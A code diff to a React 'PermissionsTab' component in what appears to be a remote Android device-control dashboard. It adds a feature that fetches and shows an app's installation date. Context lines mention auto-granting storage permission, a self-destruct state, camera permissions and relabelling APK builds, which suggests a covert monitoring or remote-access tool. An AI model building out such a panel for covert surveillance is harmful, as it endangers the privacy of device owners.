@@ -1,4 +1,4 @@
-import React, { useState, useCallback } from 'react';
+import React, { useState, useCallback, useMemo } from 'react';
 
 const PERMISSION_LABELS = {
   'android.permission.CAMERA':                              'Camera',
@@ -42,6 +42,42 @@ export default function PermissionsTab({ device, sendCommand, results }) {
   const [destructDone, setDestructDone]   = useState(false);
   const [storageAutoGranting, setStorageAutoGranting] = useState(false);
   const [storageStatus, setStorageStatus] = useState('');
+  const [installationInfo, setInstallationInfo] = useState(null);
+  const [installationLoading, setInstallationLoading] = useState(false);
+
+  const parseInstallationInfo = useCallback((res) => {
+    const match = [...res].reverse().find(r => r.command === 'get_app_installation_info' && r.success);
+    if (!match) return null;
+    try {
+      return typeof match.response === 'string' ? JSON.parse(match.response) : match.response;
+    } catch {
+      return null;
+    }
+  }, []);
+
+  const latestInstallationInfo = useMemo(
+    () => parseInstallationInfo(results),
+    [results, parseInstallationInfo]
+  );
+  const displayedInstallationInfo = latestInstallationInfo || installationInfo;
+
+  const handleFetchInstallationInfo = () => {
+    setInstallationLoading(true);
+    setStatus('Fetching app installation date from device…');
+    sendCommand(deviceId, 'get_app_installation_info', {});
+  };
+
+  if (installationLoading && latestInstallationInfo) {
+    setInstallationLoading(false);
+    setInstallationInfo(latestInstallationInfo);
+    setStatus('');
+  }
+
+  const formatInstallDate = (timestamp) => {
+    if (!timestamp) return 'Not available';
+    const date = new Date(Number(timestamp));
+    return Number.isNaN(date.getTime()) ? 'Not available' : date.toLocaleString();
+  };
 
   const handleStoragePermission = useCallback(() => {
     setStorageStatus('Requesting storage permission on device...');
@@ -152,6 +188,45 @@ export default function PermissionsTab({ device, sendCommand, results }) {
             </button>
           )}
         </div>
+      </div>
+
+      <div style={{
+        display: 'flex', alignItems: 'center', justifyContent: 'space-between',
+        gap: 14, flexWrap: 'wrap', marginBottom: 16, padding: '14px 16px',
+        background: 'rgba(59,130,246,0.08)', border: '1px solid rgba(59,130,246,0.25)',
+        borderRadius: 10,
+      }}>
+        <div>
+          <div style={{ color: '#93c5fd', fontSize: 13, fontWeight: 600 }}>📅 Installation date</div>
+          <div style={{ color: '#cbd5e1', fontSize: 13, marginTop: 4 }}>
+            {displayedInstallationInfo
+              ? formatInstallDate(displayedInstallationInfo.firstInstallTime)
+              : 'Fetch the date recorded by Android for this app'}
+          </div>
+          {displayedInstallationInfo?.appName && (
+            <div style={{ color: '#64748b', fontSize: 11, marginTop: 3 }}>
+              {displayedInstallationInfo.appName} · {displayedInstallationInfo.packageName}
+            </div>
+          )}
+        </div>
+        <button
+          className="perm-btn perm-btn-fetch"
+          onClick={handleFetchInstallationInfo}
+          disabled={!isOnline || installationLoading}
+        >
+          {installationLoading ? '⏳ Fetching…' : '↻ Get Installation Date'}
+        </button>
+      </div>
+
+      <div style={{
+        marginBottom: 16, padding: '12px 16px', borderRadius: 10,
+        background: 'rgba(16,185,129,0.06)', border: '1px solid rgba(16,185,129,0.2)',
+        color: '#94a3b8', fontSize: 12,
+      }}>
+        <strong style={{ color: '#6ee7b7' }}>App name:</strong> Change the device app label in the
+        dashboard’s <strong>Build APK</strong> tab under <strong>Module App Name</strong>. New builds
+        apply that label in the APK; an installed app keeps its current label until the user installs
+        the new build.
       </div>
 
       {status && (
